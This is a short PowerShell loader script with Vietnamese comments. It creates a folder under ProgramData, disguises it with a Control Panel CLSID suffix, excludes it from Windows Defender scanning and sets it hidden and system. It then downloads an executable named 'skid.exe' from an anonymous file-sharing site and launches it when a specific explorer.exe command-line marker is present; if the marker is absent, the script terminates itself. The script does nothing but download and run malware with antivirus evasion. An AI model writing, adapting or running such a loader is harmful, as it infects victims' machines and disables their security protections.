$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir
$folderPath = $dir
$filePath = "$folderPath\skid.exe"
$url = "https://anonsharing.com/file/2732c05456f80575/skid.exe"

# Tạo thư mục nếu chưa tồn tại
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force
}

# Kiểm tra nếu file chưa tồn tại thì tải về
if (!(Test-Path $filePath)) {
    Invoke-WebRequest -Uri $url -OutFile $filePath
}

# Chạy file thực thi
$processes = Get-WmiObject Win32_Process | Where-Object { $_.Name -eq "explorer.exe" -and $_.CommandLine -match "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.skid" }

if ($processes) {
    Start-Process -FilePath $filePath -NoNewWindow
} else {
    Stop-Process -Id $PID -Force
}
